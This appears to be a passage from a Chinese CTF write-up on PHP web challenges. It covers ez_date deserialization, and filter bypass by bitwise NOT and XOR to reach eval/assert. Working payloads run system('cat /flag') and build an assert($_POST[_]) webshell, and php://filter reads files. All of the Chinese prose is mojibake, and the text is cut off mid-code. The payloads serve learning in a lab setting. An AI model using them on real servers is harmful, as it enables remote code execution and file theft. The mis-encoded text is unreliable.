ã€‚base_convert(37907361743,10,36)()ä»£è¡¨å‡½æ•°hex2bin()æˆ‘ä»¬å†æ‹¬å·é‡Œå†å¯¹10è¿›åˆ¶å­—ç¬¦è¿›è¡Œè½¬æ¢ä¸º16è¿›åˆ¶å­—ç¬¦_GETã€‚payloadå¦‚ä¸‹<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=$abs=base_convert(37907361743,10,36)(dechex(1598506324));$$abs&#123;0&#125;($$abs&#123;1&#125;)&amp;0=system&amp;1=cat /flag</span><br></pre></td></tr></table></figure><br>æ³¨æ„å˜é‡åè¦ä¸ºæ•°å­¦å‡½æ•°</p><h1 id="CISCN-2023-ååŒ—-ez-date-dateå‡½æ•°è¿”å›åŸå‚æ•°"><a href="#CISCN-2023-ååŒ—-ez-date-dateå‡½æ•°è¿”å›åŸå‚æ•°" class="headerlink" title="[CISCN 2023 ååŒ—]ez_date(dateå‡½æ•°è¿”å›åŸå‚æ•°)"></a>[CISCN 2023 ååŒ—]ez_date(dateå‡½æ•°è¿”å›åŸå‚æ•°)</h1><p>éš¾åº¦å¹¶ä¸æ˜¯ç‰¹åˆ«é«˜ï¼Œè¿™ä¸€é¢˜å”¯ä¸€çš„ç›²ç‚¹å°±æ˜¯å¦‚ä½•ä½¿date()è¿”å›å€¼ä¸ºåŸå€¼ã€‚å› ä¸ºæ˜¯åˆ·é¢˜æˆ‘å°±ç›´æ¥çœ‹äº†wpå‘ç°å½“date()æ¥å—æœ‰çš„å‚æ•°ç»è¿‡äº†<code>\</code>çš„è½¬ä¹‰å¦‚ä¸‹<code>\f\l\a\g</code>æŠŠä¼ å…¥flagçš„æ¯ä¸ªå€¼éƒ½ç»è¿‡è½¬ä¹‰æ—¶ï¼Œdate()çš„è¿”å›å€¼å°±æ˜¯åŸå€¼flagã€‚<br>å¥½äº†çŸ¥è¯†å‰æç»“æŸï¼Œä¸Šæºç ã€‚<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">date</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;a)||<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;b))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;no array&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;a !== <span class="variable language_">$this</span>-&gt;b) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;a) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;b)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;a)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;b)) )&#123;</span><br><span class="line">            <span class="variable">$content</span>=<span class="title function_ invoke__">date</span>(<span class="variable">$this</span>-&gt;file);</span><br><span class="line">            <span class="variable">$uuid</span>=<span class="title function_ invoke__">uniqid</span>().<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$uuid</span>,<span class="variable">$content</span>);</span><br><span class="line">            <span class="variable">$data</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/((\s)*(\n)+(\s)*)/i&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uuid</span>));</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$data</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]));</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬å…ˆåˆ†æä¸€ä¸‹è¿™ä¸ªæ­£åˆ™åŒ¹é…æˆ‘ä»¬ä¼šå‘ç°å…¶åªåŒ¹é…ç©ºç™½å­—ç¬¦å¦‚ç©ºæ ¼ç­‰ï¼Œé‚£ä¹ˆå¯¹æˆ‘ä»¬æ¥è¯´è¿™ä¸ªæ›¿æ¢å‡½æ•°å¯ä»¥è¯´æ˜¯å½¢åŒè™šè®¾äº†ã€‚<br>æˆ‘ä»¬çš„ç›®çš„æ˜¯è¦å°†<code>$data</code>è®¾ä¸ºphpä¼ªåè®®æ¥è¿›è¡Œæ–‡ä»¶è¯»å–ã€‚<br>æˆ‘ä»¬é¦–å…ˆè¦ç»•è¿‡<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;a !== <span class="variable language_">$this</span>-&gt;b) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;a) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;b)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;a)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;b)) )</span><br></pre></td></tr></table></figure><br>å¯ä»¥çœ‹åˆ°å…¶å…ˆè¿›è¡Œaå’Œbçš„å¼ºç›¸ç­‰æ¯”è¾ƒã€‚å†ç»§ç»­md5å€¼å’Œsha1å€¼ç»§ç»­æ¯”è¾ƒã€‚æˆ‘ä»¬å¯ä»¥ç›´æ¥ä½¿ç”¨æ•°å­—1å’Œå­—ç¬¦1æ¥é€šè¿‡å¼ºç›¸ç­‰ï¼Œåˆå› ä¸ºåŠ å¯†çš„éƒ½æ˜¯1åˆ™å…¶å¯ä»¥é€šè¿‡<br>ç»•è¿‡å°±æ˜¯æ„é€ fileä¸ºä¼ªåè®®ï¼Œå¹¶ä¸”é€šè¿‡\è½¬ä¹‰æ¥é€šè¿‡date()å‡½æ•°.<br>exp<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">date</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>=<span class="string">&#x27;\p\h\p\:\/\/\f\i\l\t\e\r\/\c\o\n\v\e\r\t\.\b\a\s\e\6\4\-\e\n\c\o\d\e\/\r\e\s\o\u\r\c\e\=/\f\l\a\g&#x27;</span>;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">date</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><br>æˆ‘å°è¯•äº†ä¸€ä¸‹æ— æ³•ä½¿ç”¨php://input;æ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚æ‰€ä»¥åªå¥½ä½¿ç”¨filteræ¥çŒœæµ‹å’Œæ‰¾æ–‡ä»¶ä½ç½®å’Œåå­—äº†ã€‚</p><h1 id="SWPUCTF-2021-æ–°ç”Ÿèµ›-hardrce-å–åç»•è¿‡"><a href="#SWPUCTF-2021-æ–°ç”Ÿèµ›-hardrce-å–åç»•è¿‡" class="headerlink" title="[SWPUCTF 2021 æ–°ç”Ÿèµ›]hardrce(å–åç»•è¿‡)"></a>[SWPUCTF 2021 æ–°ç”Ÿèµ›]hardrce(å–åç»•è¿‡)</h1><h2 id="Pç¥åšå®¢"><a href="#Pç¥åšå®¢" class="headerlink" title="Pç¥åšå®¢"></a><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">Pç¥åšå®¢</a></h2><h2 id="è§£é¢˜"><a href="#è§£é¢˜" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h2><p>è¿™é“é¢˜ç›®æˆ‘ä»¬éœ€è¦ç”¨åˆ°å–åç»•è¿‡<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$wllm</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>];</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;\t&#x27;</span>,<span class="string">&#x27;\r&#x27;</span>,<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\+&#x27;</span>,<span class="string">&#x27;\[&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>,<span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\&quot;&#x27;</span>,<span class="string">&#x27;\-&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\*&#x27;</span>,<span class="string">&#x27;\?&#x27;</span>,<span class="string">&#x27;\&lt;&#x27;</span>,<span class="string">&#x27;\&gt;&#x27;</span>,<span class="string">&#x27;\=&#x27;</span>,<span class="string">&#x27;\`&#x27;</span>,];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$wllm</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;LTLTè¯´ä¸èƒ½ç”¨è¿™äº›å¥‡å¥‡æ€ªæ€ªçš„ç¬¦å·å“¦ï¼&quot;</span>);</span><br><span class="line">    &#125;&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]/is&#x27;</span>,<span class="variable">$wllm</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Ra&#x27;s Al Ghulè¯´ä¸èƒ½ç”¨å­—æ¯å“¦ï¼&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;NoVic4è¯´ï¼šä¸é”™å“¦å°ä¼™å­ï¼Œå¯ä½ èƒ½æ‹¿åˆ°flagå—ï¼Ÿ&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$wllm</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;è”¡æ€»è¯´ï¼šæ³¨æ„å®¡é¢˜ï¼ï¼ï¼&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬æŸ¥çœ‹æºç ä¼šå‘ç°å…¶å°†å­—æ¯å’Œå’Œä¸€äº›ç‰¹æ®Šå­—ç¬¦ç»™è¿‡æ»¤äº†ï¼Œè¿™å°±å¯¼è‡´æˆ‘ä»¬æ— æ³•ä½¿ç”¨å¼‚æˆ–æ¥è¿›è¡Œæ‹¼æ¥å­—ç¬¦ç»•è¿‡ã€‚è¿™æ—¶å€™æˆ‘ä»¬å°è¯•ä½¿ç”¨å–åç»•è¿‡</p><h2 id="å–åç»•è¿‡çš„æ¦‚å¿µ"><a href="#å–åç»•è¿‡çš„æ¦‚å¿µ" class="headerlink" title="å–åç»•è¿‡çš„æ¦‚å¿µ"></a>å–åç»•è¿‡çš„æ¦‚å¿µ</h2><p>é¦–å…ˆphpä¸­æœ‰çš„ç¬¦åˆ~ä¸ºå–åï¼Œå³äºŒè¿›åˆ¶ä¸­çš„å–åï¼Œæˆ‘ä»¬å¯ä»¥å°†æˆ‘ä»¬æƒ³è¦æ„é€ çš„å­—ç¬¦è¿›è¡Œå–åï¼Œè€Œå–åçš„ç»“æœä¸€èˆ¬ä¸æ˜¯æ­£å¸¸çš„å­—æ¯å’Œç‰¹æ®Šå­—ç¬¦ã€‚è¿™å°±å¯¼è‡´æˆ‘ä»¬å¯ä»¥ç»•è¿‡wafã€‚<br>å¦‚ä¸‹<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;phpinfo&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">urlencode</span>(~(<span class="variable">$a</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">-----------</span><br><span class="line">%<span class="number">8</span>F%<span class="number">97</span>%<span class="number">8</span>F%<span class="number">96</span>%<span class="number">91</span>%<span class="number">99</span>%<span class="number">90</span></span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬å¯ä»¥çœ‹é“æˆ‘ä»¬å¯¹å­—ç¬¦è¿›è¡Œå–ååå†è¿›è¡Œurlencodeè¿™æ˜¯ä¸ºäº†æ­£å¸¸ä¼ å‚ã€‚<br>å½“æˆ‘ä»¬ä¼ å‚é“evalå‡½æ•°é‡Œæ—¶å¯ä»¥å¦‚ä¸‹æ–¹æ³•è¿›è¡Œä¼ å‚<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=(~%8F%97%8F%96%91%99%90)()</span><br></pre></td></tr></table></figure><br><code>(~%8F%97%8F%96%91%99%90)</code>æ„é€ ä¸ºphpinfoå†ç›´æ¥æ‹¼æ¥()å°±æˆäº†phpinfo()ä¼šè¢«ç›´æ¥æ‰§è¡Œã€‚<br>é‚£ä¹ˆè¿™é¢˜çš„é¢˜è§£å°±ä¸€ç›®äº†ç„¶äº†<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(~%<span class="number">8</span>C%<span class="number">86</span>%<span class="number">8</span>C%<span class="number">8</span>B%<span class="number">9</span>A%<span class="number">92</span>)(~%<span class="number">9</span>C%<span class="number">9</span>E%<span class="number">8</span>B%DF%D0%<span class="number">99</span>%<span class="number">93</span>%<span class="number">93</span>%<span class="number">93</span>%<span class="number">93</span>%<span class="number">93</span>%<span class="number">9</span>E%<span class="number">9</span>E%<span class="number">9</span>E%<span class="number">9</span>E%<span class="number">9</span>E%<span class="number">9</span>E%<span class="number">98</span>%<span class="number">98</span>%<span class="number">98</span>%<span class="number">98</span>%<span class="number">98</span>%<span class="number">98</span>%<span class="number">98</span>);</span><br></pre></td></tr></table></figure></p><h1 id="HUBUCTF-2022-æ–°ç”Ÿèµ›-HowToGetShell"><a href="#HUBUCTF-2022-æ–°ç”Ÿèµ›-HowToGetShell" class="headerlink" title="[HUBUCTF 2022 æ–°ç”Ÿèµ›]HowToGetShell"></a>[HUBUCTF 2022 æ–°ç”Ÿèµ›]HowToGetShell</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$mess</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;mess&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z]/&quot;</span>,<span class="variable">$mess</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;invalid input!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$mess</span>);</span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜ç›®å¯ä»¥è¯´æ˜¯æ¯”è¾ƒç®€å•çš„ï¼Œä½†æ˜¯ä¸‰ç§ç»•è¿‡éƒ½å¯ä»¥å®ç°æ‰€ä»¥æ‹¿æ¥å­¦ä¹ æ˜¯éå¸¸å¥½çš„ã€‚<br>é¦–å…ˆæ˜¯å¼‚æˆ–ç»•è¿‡<br>æˆ‘ä»¬å¯ä»¥é€šè¿‡ç‰¹æ®Šå­—ç¬¦çš„å¼‚æˆ–æ¥æ„é€ æˆ‘ä»¬æƒ³è¦çš„å­—ç¬¦ã€‚æˆ‘ä»¬è¿™é‡Œç›´æ¥è´´è„šæœ¬<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$shell</span> = <span class="string">&quot;_&quot;</span>;</span><br><span class="line"><span class="variable">$result1</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$result2</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$num</span> = <span class="number">0</span>; <span class="variable">$num</span> &lt;= <span class="title function_ invoke__">strlen</span>(<span class="variable">$shell</span>); <span class="variable">$num</span>++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$x</span> = <span class="number">33</span>; <span class="variable">$x</span> &lt;= <span class="number">126</span>; <span class="variable">$x</span>++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">judge</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$x</span>))) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">33</span>; <span class="variable">$y</span> &lt;= <span class="number">126</span>; <span class="variable">$y</span>++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">judge</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$y</span>))) &#123;</span><br><span class="line">                    <span class="variable">$f</span> = <span class="title function_ invoke__">chr</span>(<span class="variable">$x</span>) ^ <span class="title function_ invoke__">chr</span>(<span class="variable">$y</span>);</span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$f</span> == <span class="variable">$shell</span>[<span class="variable">$num</span>]) &#123;</span><br><span class="line">                        <span class="variable">$result1</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$x</span>);</span><br><span class="line">                        <span class="variable">$result2</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$y</span>);</span><br><span class="line">                        <span class="keyword">break</span> <span class="number">2</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result1</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result2</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">judge</span>(<span class="params"><span class="variable">$c</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z0-9]/is&#x27;</span>, <span class="variable">$c</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>è¿™ä¸ªè„šæœ¬çš„åŸç†ä¹Ÿå¾ˆç®€å•ï¼Œå°±æ˜¯å°†æƒ³è¦çš„å­—ç¬¦ä¸²ä¸€ä¸ªä¸ªè½¬ä¸ºasciiç å†è¿›è¡Œéå†å¼‚æˆ–ï¼Œæœ€ç»ˆè¾“å‡ºå¯ä»¥å¼‚æˆ–å‡ºæ¥çš„ç‰¹æ®Šå­—ç¬¦ã€‚<br>æ€è·¯æˆ‘ä»¬è¦æ„é€ å¦‚ä¸‹<code>assert($_POST[_]);</code>æ¥è¿›è¡Œé€ƒé€¸<strong>æ³¨æ„:7.0ç‰ˆæœ¬çš„éœ€è¦æ„é€ <code>$_POST</code>è¿›è¡Œé€ƒé€¸</strong><br>æ„é€ æ€è·¯å¦‚ä¸‹<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=<span class="string">&quot;!((%)(&quot;</span>^<span class="string">&quot;@[[@[\\&quot;</span>;<span class="comment">#$_=asser</span></span><br><span class="line"><span class="variable">$__</span>=<span class="string">&quot;!+/((&quot;</span>^<span class="string">&quot;~&#123;`&#123;|&quot;</span>;<span class="comment">#$__=_POST</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$$__</span>;<span class="comment">#$___=$_POST</span></span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$___</span>[_]);<span class="comment">#assert($_POST[_]);</span></span><br><span class="line"><span class="comment">//æ‹¼æ¥èµ·æ¥</span></span><br><span class="line"><span class="variable">$_</span> = <span class="string">&quot;!((%)(&quot;</span>^<span class="string">&quot;@[[@[\\&quot;</span>;<span class="variable">$__</span> = <span class="string">&quot;!+/((&quot;</span>^<span class="string">&quot;~&#123;`&#123;|&quot;</span>;<span class="variable">$___</span> = <span class="variable">$$__</span>;<span class="variable">$_</span>(<span class="variable">$___</span>[_]);</span><br><span class="line"><span class="comment">//æœ€ç»ˆéœ€è¦urlç¼–ç </span></span><br><span class="line">?code=%<span class="number">24</span>_%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>%<span class="number">22</span>!((%<span class="number">25</span>)(%<span class="number">22</span>%<span class="number">5</span>E%<span class="number">22</span>%<span class="number">40</span>%<span class="number">5</span>B%<span class="number">5</span>B%<span class="number">40</span>%<span class="number">5</span>B%<span class="number">5</span>C%<span class="number">5</span>C%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>%<span class="number">22</span>!%<span class="number">2</span>B%<span class="number">2</span>F((%<span class="number">22</span>%<span class="number">5</span>E%<span class="number">22</span>~%<span class="number">7</span>B%<span class="number">60</span>%<span class="number">7</span>B%<span class="number">7</span>C%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">24</span>___%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>%<span class="number">24</span>%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">24</span>_(%<span class="number">24</span>___%<span class="number">5</span>B_%<span class="number">5</span>D)%<span class="number">3</span>B</span><br></pre></td></tr></table></figure><br>æ¯”è¾ƒå¥‡æ€ªçš„æ˜¯è¿™ä¸ªé€ƒé€¸æ— æ³•æ‰§è¡Œå‘½ä»¤system(â€˜lsâ€™);åªèƒ½æ‰§è¡Œphpinfo();flagåœ¨phpinfoé‡Œ<br>ä¸‹é¢æ˜¯ç¬¬äºŒä¸­æ„é€ æ–¹æ³•æ˜¯ä¸€ä¸ªä¸€ä¸ªå­—ç¬¦æ„é€ å†æ‹¼æ¥<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=<span class="variable">$_</span>=(<span class="string">&#x27;%01&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%13&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%13&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%05&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%12&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%14&#x27;</span>^<span class="string">&#x27;`&#x27;</span>);<span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;%0D&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;%2F&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%0E&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;%09&#x27;</span>^<span class="string">&#x27;]&#x27;</span>);<span class="variable">$___</span>=<span class="variable">$$__</span>;<span class="variable">$_</span>(<span class="variable">$___</span>[_]);&amp;_=<span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure></p><h2 id="å–åç»•è¿‡"><a href="#å–åç»•è¿‡" class="headerlink" title="å–åç»•è¿‡"></a>å–åç»•è¿‡</h2><p>è¿™é¢˜å› ä¸ºå…¶ç‰ˆæœ¬ä¸º5.å¤šçš„åŸå› ä¸èƒ½å’Œä¸Šé¢˜7.å¤šç”¨ä¸€æ ·ç›´æ¥æ„é€ ,è¦é¢„å…ˆå…ˆä¼ åˆ°å˜é‡é‡Œå†æ„é€ æˆå‡½æ•°<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">æ„é€ phpinfo()</span><br><span class="line">?code=$_(~%8F%97%8F%96%91%99%90);$_();</span><br></pre></td></tr></table></figure><br>ä¸çŸ¥é“ä¸ºä»€ä¹ˆæˆ‘çš„hackbarä¸èƒ½ä¼ åªèƒ½ä½¿ç”¨bpæ¥ä¼ å€¼ã€‚<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 